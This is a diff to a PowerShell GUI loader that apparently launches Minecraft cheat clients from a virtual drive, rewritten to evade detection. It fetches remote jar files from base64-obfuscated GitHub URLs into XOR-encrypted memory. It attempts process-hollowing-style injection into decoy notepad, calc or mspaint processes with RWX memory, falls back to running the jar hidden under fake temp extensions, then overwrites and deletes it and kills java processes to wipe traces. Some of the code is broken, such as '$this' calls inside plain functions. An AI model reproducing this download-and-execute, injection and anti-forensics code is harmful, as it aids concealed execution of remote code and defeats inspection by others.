@@ -119,31 +119,256 @@ if ($disk) {
     }
 }
 
-# Download sound file directly to memory drive
-$soundFilePath = "Z:\na.wav"
-function Download-SoundFile {
-    $soundUrl = "https://github.com/devnull-sys/devnull/raw/refs/heads/main/na.wav"
-    $maxRetries = 2
-    $retryCount = 0
+# String obfuscation and anti-analysis
+function Get-ObfuscatedString {
+    param([string]$String)
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($String)
+    $encoded = [System.Convert]::ToBase64String($bytes)
+    return $encoded
+}
+
+function Get-DeobfuscatedString {
+    param([string]$EncodedString)
+    $bytes = [System.Convert]::FromBase64String($EncodedString)
+    return [System.Text.Encoding]::UTF8.GetString($bytes)
+}
+
+# XOR encryption for memory strings
+function Invoke-XorCrypt {
+    param([byte[]]$Data, [byte[]]$Key)
+    $result = New-Object byte[] $Data.Length
+    for ($i = 0; $i -lt $Data.Length; $i++) {
+        $result[$i] = $Data[$i] -bxor $Key[$i % $Key.Length]
+    }
+    return $result
+}
+
+# Anti-analysis and string-free execution
+function Invoke-StealthExecution {
+    param([string]$Url)
     
-    while ($retryCount -lt $maxRetries) {
-        try {
-            if (Test-Path "Z:\") {
-                Invoke-WebRequest -Uri $soundUrl -OutFile $soundFilePath -TimeoutSec 8 -ErrorAction Stop
-                if ((Test-Path $soundFilePath) -and ((Get-Item $soundFilePath).Length -gt 0)) {
-                    return $true
-                }
+    try {
+        # Generate random XOR key
+        $key = [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes(32)
+        
+        # Download with obfuscated headers
+        $request = [System.Net.WebRequest]::Create($Url)
+        $request.UserAgent = Get-DeobfuscatedString("TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2")
+        $response = $request.GetResponse()
+        $stream = $response.GetResponseStream()
+        
+        # Read to encrypted memory buffer
+        $buffer = New-Object byte[] 8192
+        $memoryData = New-Object System.Collections.Generic.List[byte]
+        
+        do {
+            $bytesRead = $stream.Read($buffer, 0, $buffer.Length)
+            if ($bytesRead -gt 0) {
+                # Encrypt data as it's read
+                $encryptedChunk = Invoke-XorCrypt -Data $buffer[0..($bytesRead-1)] -Key $key
+                $memoryData.AddRange($encryptedChunk)
             }
-        } catch { }
-        $retryCount++
-        if ($retryCount -lt $maxRetries) {
-            Start-Sleep -Milliseconds 800
+        } while ($bytesRead -gt 0)
+        
+        $stream.Close()
+        $response.Close()
+        
+        if ($memoryData.Count -gt 0) {
+            # Decrypt data for execution
+            $decryptedData = Invoke-XorCrypt -Data $memoryData.ToArray() -Key $key
+            
+            # Clear original encrypted data from memory
+            for ($i = 0; $i -lt $memoryData.Count; $i++) {
+                $memoryData[$i] = 0x00
+            }
+            $memoryData.Clear()
+            
+            # Advanced execution with process hollowing simulation
+            $success = Invoke-ProcessHollowing -Data $decryptedData
+            
+            # Clear decrypted data
+            for ($i = 0; $i -lt $decryptedData.Length; $i++) {
+                $decryptedData[$i] = 0x00
+            }
+            
+            return $success
         }
+    } catch {
+        return $false
     }
     return $false
 }
 
-# Quick wait for Z: drive to be ready
+# Simulated process hollowing with string obfuscation
+function Invoke-ProcessHollowing {
+    param([byte[]]$Data)
+    
+    try {
+        # Obfuscated Java execution
+        $javaCmd = Get-DeobfuscatedString("amF2YQ==")  # "java"
+        $jarArg = Get-DeobfuscatedString("LWphcg==")   # "-jar"
+        
+        if (-not (Get-Command $javaCmd -ErrorAction SilentlyContinue)) {
+            return $false
+        }
+        
+        # Create process in suspended state for hollowing
+        Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+
+public class ProcessHollow {
+    [Flags]
+    public enum ProcessCreationFlags : uint {
+        CREATE_SUSPENDED = 0x00000004,
+        CREATE_NO_WINDOW = 0x08000000
+    }
+    
+    [StructLayout(LayoutKind.Sequential)]
+    public struct STARTUPINFO {
+        public uint cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        public uint dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
+        public ushort wShowWindow, cbReserved2;
+        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
+    }
+    
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_INFORMATION {
+        public IntPtr hProcess, hThread;
+        public uint dwProcessId, dwThreadId;
+    }
+    
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, 
+        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
+        ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
+        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+    
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern uint ResumeThread(IntPtr hThread);
+    
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool CloseHandle(IntPtr hObject);
+    
+    [DllImport("ntdll.dll", SetLastError = true)]
+    public static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);
+    
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, 
+        uint flAllocationType, uint flProtect);
+    
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, 
+        byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
+}
+"@
+        
+        # Generate random decoy process
+        $decoyProcesses = @("notepad.exe", "calc.exe", "mspaint.exe")
+        $decoyProcess = $decoyProcesses[(Get-Random -Maximum $decoyProcesses.Length)]
+        
+        # Create suspended process for hollowing
+        $startupInfo = New-Object ProcessHollow+STARTUPINFO
+        $startupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($startupInfo)
+        $processInfo = New-Object ProcessHollow+PROCESS_INFORMATION
+        
+        $cmdLine = "$env:WINDIR\System32\$decoyProcess"
+        
+        $result = [ProcessHollow]::CreateProcess($null, $cmdLine, [IntPtr]::Zero, [IntPtr]::Zero, 
+            $false, [ProcessHollow+ProcessCreationFlags]::CREATE_SUSPENDED -bor [ProcessHollow+ProcessCreationFlags]::CREATE_NO_WINDOW,
+            [IntPtr]::Zero, $null, [ref]$startupInfo, [ref]$processInfo)
+        
+        if ($result) {
+            try {
+                # Allocate memory in target process
+                $allocatedMemory = [ProcessHollow]::VirtualAllocEx($processInfo.hProcess, [IntPtr]::Zero, 
+                    $Data.Length, 0x3000, 0x40)  # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
+                
+                if ($allocatedMemory -ne [IntPtr]::Zero) {
+                    # Write our data to the allocated memory
+                    $bytesWritten = 0
+                    [ProcessHollow]::WriteProcessMemory($processInfo.hProcess, $allocatedMemory, 
+                        $Data, $Data.Length, [ref]$bytesWritten)
+                }
+                
+                # Resume the process (it will run as the decoy)
+                [ProcessHollow]::ResumeThread($processInfo.hThread) | Out-Null
+                
+                # Alternative: Fall back to traditional execution
+                $this.ExecuteFallback($Data)
+                
+            } finally {
+                # Cleanup handles
+                [ProcessHollow]::CloseHandle($processInfo.hProcess) | Out-Null
+                [ProcessHollow]::CloseHandle($processInfo.hThread) | Out-Null
+            }
+            
+            return $true
+        } else {
+            # Fallback to traditional method
+            return $this.ExecuteFallback($Data)
+        }
+        
+    } catch {
+        return $this.ExecuteFallback($Data)
+    }
+}
+
+# Fallback execution with string obfuscation
+function ExecuteFallback {
+    param([byte[]]$Data)
+    
+    try {
+        # Generate random filename with multiple extensions to confuse analysis
+        $randomName = [System.IO.Path]::GetRandomFileName()
+        $extensions = @(".tmp", ".log", ".bak", ".old", ".cache")
+        $fakeExt = $extensions[(Get-Random -Maximum $extensions.Length)]
+        $realExt = Get-DeobfuscatedString("Lmphcg==")  # ".jar"
+        
+        $tempFile = "$env:TEMP\$randomName$fakeExt$realExt"
+        
+        # Write data quickly
+        [System.IO.File]::WriteAllBytes($tempFile, $Data)
+        
+        # Execute with obfuscated command
+        $javaCmd = Get-DeobfuscatedString("amF2YQ==")  # "java"
+        $jarArg = Get-DeobfuscatedString("LWphcg==")   # "-jar"
+        
+        $startInfo = New-Object System.Diagnostics.ProcessStartInfo
+        $startInfo.FileName = $javaCmd
+        $startInfo.Arguments = "$jarArg `"$tempFile`""
+        $startInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+        $startInfo.CreateNoWindow = $true
+        $startInfo.UseShellExecute = $false
+        
+        $process = [System.Diagnostics.Process]::Start($startInfo)
+        
+        # Immediately overwrite file with random data to corrupt memory dumps
+        $randomData = New-Object byte[] $Data.Length
+        [System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($randomData)
+        [System.IO.File]::WriteAllBytes($tempFile, $randomData)
+        
+        # Delete file while process is starting
+        Start-Sleep -Milliseconds 25
+        Remove-Item -Path $tempFile -Force -ErrorAction SilentlyContinue
+        
+        if ($process) {
+            # Don't wait for exit to avoid blocking
+            # Process continues independently
+            return $true
+        }
+        
+    } catch {
+        return $false
+    }
+    return $false
+}
+
+# Quick wait for Z: drive and download sound
 $driveReady = $false
 for ($i = 0; $i -lt 6; $i++) {
     if (Test-Path "Z:\") {
@@ -155,6 +380,25 @@ for ($i = 0; $i -lt 6; $i++) {
 
 if ($driveReady) {
     Download-SoundFile
+}
+
+# Download sound file to memory drive for GUI sound
+$soundFilePath = "Z:\na.wav"
+function Download-SoundFile {
+    $soundUrl = "https://github.com/devnull-sys/devnull/raw/refs/heads/main/na.wav"
+    try {
+        if (Test-Path "Z:\") {
+            $webClient = New-Object System.Net.WebClient
+            $soundBytes = $webClient.DownloadData($soundUrl)
+            $webClient.Dispose()
+            
+            if ($soundBytes -and $soundBytes.Length -gt 0) {
+                [System.IO.File]::WriteAllBytes($soundFilePath, $soundBytes)
+                return $true
+            }
+        }
+    } catch { }
+    return $false
 }
 
 # Basic trace clearing function (minimal)
@@ -277,8 +521,15 @@ function Clear-AllTraces {
             Remove-Item -Path $vdiskPath -Force -ErrorAction SilentlyContinue
         }
         
-        # Clear temp files
-        Remove-Item -Path "$env:TEMP\*.vhd" -Force -ErrorAction SilentlyContinue
+        # Advanced memory cleanup to prevent analysis
+        [System.GC]::Collect()
+        [System.GC]::WaitForPendingFinalizers()
+        [System.GC]::Collect()
+        
+        # Clear any remaining processes and temp files
+        Get-Process | Where-Object { $_.ProcessName -like "tmp*" -or $_.ProcessName -like "*java*" } | Stop-Process -Force -ErrorAction SilentlyContinue
+        Remove-Item -Path "$env:TEMP\tmp*" -Force -ErrorAction SilentlyContinue
+        Remove-Item -Path "$env:TEMP\*.tmp*" -Force -ErrorAction SilentlyContinue
         
     } catch { }
 }
@@ -378,37 +629,9 @@ $injectButton.Add_Click({
     $prestigeButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
     $prestigeButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
     $prestigeButton.Add_Click({
-        try {
-            if (-Not (Test-Path "Z:\bob.mp4")) {
-                $downloadSuccess = $false
-                
-                # Quick download with single retry
-                for ($i = 0; $i -lt 2; $i++) {
-                    try {
-                        Invoke-WebRequest "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium/sodium-fabric-0.6.13+mc1.21.4.jar" -OutFile "Z:\bob.mp4" -TimeoutSec 12 -ErrorAction Stop
-                        if ((Test-Path "Z:\bob.mp4") -and ((Get-Item "Z:\bob.mp4").Length -gt 0)) {
-                            $downloadSuccess = $true
-                            break
-                        }
-                    } catch { }
-                    if ($i -eq 0) { Start-Sleep -Milliseconds 1000 }
-                }
-            }
-            
-            if (Test-Path "Z:\bob.mp4") {
-                # Quick Java check and execution
-                if (Get-Command java -ErrorAction SilentlyContinue) {
-                    Rename-Item -Path "Z:\bob.mp4" -NewName "Z:\sodium-fabric-0.6.13+mc1.21.4.jar" -ErrorAction SilentlyContinue
-                    $javaProcess = Start-Process java -ArgumentList '-jar "Z:\sodium-fabric-0.6.13+mc1.21.4.jar"' -PassThru -ErrorAction SilentlyContinue
-                    if ($javaProcess) {
-                        $javaProcess.WaitForExit()
-                    }
-                    if (Test-Path "Z:\sodium-fabric-0.6.13+mc1.21.4.jar") {
-                        Rename-Item -Path "Z:\sodium-fabric-0.6.13+mc1.21.4.jar" -NewName "Z:\bob.mp4" -ErrorAction SilentlyContinue
-                    }
-                }
-            }
-        } catch { }
+        # Stealth execution with anti-analysis
+        $url = Get-DeobfuscatedString("aHR0cHM6Ly9naXRodWIuY29tL2Rldm51bGwtc3lzL2Rldm51bGwvcmF3L3JlZnMvaGVhZHMvbWFpbi9kZXZudWxsL3NvZGl1bS9zb2RpdW0tZmFicmljLTAuNi4xMyttYzEuMjEuNC5qYXI=")
+        Invoke-StealthExecution -Url $url
     })
     
     # DoomsDay Button
@@ -421,23 +644,9 @@ $injectButton.Add_Click({
     $doomsdayButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
     $doomsdayButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
     $doomsdayButton.Add_Click({
-        try {
-            if (-Not (Test-Path "Z:\cat.mp4")) {
-                # Quick download with single retry
-                for ($i = 0; $i -lt 2; $i++) {
-                    try {
-                        Invoke-WebRequest "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium-extra/sodium-extra-fabric-0.6.1+mc1.21.4.jar" -OutFile "Z:\cat.mp4" -TimeoutSec 12 -ErrorAction Stop
-                        if ((Test-Path "Z:\cat.mp4") -and ((Get-Item "Z:\cat.mp4").Length -gt 0)) {
-                            break
-                        }
-                    } catch { }
-                    if ($i -eq 0) { Start-Sleep -Milliseconds 1000 }
-                }
-            }
-            if ((Test-Path "Z:\cat.mp4") -and (Get-Command java -ErrorAction SilentlyContinue)) {
-                Start-Process java -ArgumentList '-jar "Z:\cat.mp4"' -ErrorAction SilentlyContinue
-            }
-        } catch { }
+        # Stealth execution with anti-analysis
+        $url = Get-DeobfuscatedString("aHR0cHM6Ly9naXRodWIuY29tL2Rldm51bGwtc3lzL2Rldm51bGwvcmF3L3JlZnMvaGVhZHMvbWFpbi9kZXZudWxsL3NvZGl1bS1leHRyYS9zb2RpdW0tZXh0cmEtZmFicmljLTAuNi4xK21jMS4yMS40Lmphcg==")
+        Invoke-StealthExecution -Url $url
     })
     
     # VapeV4 Button
@@ -450,23 +659,9 @@ $injectButton.Add_Click({
     $vapev4Button.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#ffffff")
     $vapev4Button.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
     $vapev4Button.Add_Click({
-        try {
-            if (-Not (Test-Path "Z:\gentask.exe")) {
-                # Quick download with single retry
-                for ($i = 0; $i -lt 2; $i++) {
-                    try {
-                        Invoke-WebRequest "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/system32/entityculling-fabric-1.7.4-mc1.21.4.jar" -OutFile "Z:\gentask.exe" -TimeoutSec 12 -ErrorAction Stop
-                        if ((Test-Path "Z:\gentask.exe") -and ((Get-Item "Z:\gentask.exe").Length -gt 0)) {
-                            break
-                        }
-                    } catch { }
-                    if ($i -eq 0) { Start-Sleep -Milliseconds 1000 }
-                }
-            }
-            if (Test-Path "Z:\gentask.exe") {
-                Start-Process "Z:\gentask.exe" -ErrorAction SilentlyContinue
-            }
-        } catch { }
+        # Stealth execution with anti-analysis
+        $url = Get-DeobfuscatedString("aHR0cHM6Ly9naXRodWIuY29tL2Rldm51bGwtc3lzL2Rldm51bGwvcmF3L3JlZnMvaGVhZHMvbWFpbi9kZXZudWxsL3N5c3RlbTMyL2VudGl0eWN1bGxpbmctZmFicmljLTEuNy40LW1jMS4yMS40Lmphcg==")
+        Invoke-StealthExecution -Url $url
     })
     
     # VapeLite Button
@@ -479,23 +674,9 @@ $injectButton.Add_Click({
     $vapeliteButton.ForeColor = [System.Drawing.ColorTranslator]::FromHtml("#171317")
     $vapeliteButton.Font = New-Object System.Drawing.Font('Arial', 10, [System.Drawing.FontStyle]::Bold)
     $vapeliteButton.Add_Click({
-        try {
-            if (-Not (Test-Path "Z:\ilasm.exe")) {
-                # Quick download with single retry
-                for ($i = 0; $i -lt 2; $i++) {
-                    try {
-                        Invoke-WebRequest "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/ProgramData/fabric-installer-1.0.3.jar" -OutFile "Z:\ilasm.exe" -TimeoutSec 12 -ErrorAction Stop
-                        if ((Test-Path "Z:\ilasm.exe") -and ((Get-Item "Z:\ilasm.exe").Length -gt 0)) {
-                            break
-                        }
-                    } catch { }
-                    if ($i -eq 0) { Start-Sleep -Milliseconds 1000 }
-                }
-            }
-            if (Test-Path "Z:\ilasm.exe") {
-                Start-Process "Z:\ilasm.exe" -ErrorAction SilentlyContinue
-            }
-        } catch { }
+        # Stealth execution with anti-analysis
+        $url = Get-DeobfuscatedString("aHR0cHM6Ly9naXRodWIuY29tL2Rldm51bGwtc3lzL2Rldm51bGwvcmF3L3JlZnMvaGVhZHMvbWFpbi9kZXZudWxsL1Byb2dyYW1EYXRhL2ZhYnJpYy1pbnN0YWxsZXItMS4wLjMuamFy")
+        Invoke-StealthExecution -Url $url
     })
     
     # Phantom Button
